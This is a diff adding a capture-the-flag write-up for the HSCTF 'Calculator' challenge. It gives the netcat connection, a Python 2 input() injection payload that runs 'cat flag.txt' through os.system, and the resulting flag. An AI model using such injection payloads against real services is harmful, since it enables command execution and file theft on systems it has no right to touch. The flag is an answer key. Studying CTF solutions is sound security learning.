@@ -1,0 +1,28 @@
+=====================================================
+Calculator
+=====================================================
+I'm really new to python. Please don't break my calculator!
+
+nc misc.hsctf.com 7001
+
+There is a flag.txt on the server.
+
+Author: meow
+
+=====================================================
+Solution
+=====================================================
+References:
+The python input bug:
+https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9
+
+
+Connect to the server:
+nc misc.hsctf.com 7001
+
+To solve put the follow string in the number 1 prompt:
+__import__("os").system("cat flag.txt")
+
+Then:
+flag{please_use_python3}
+
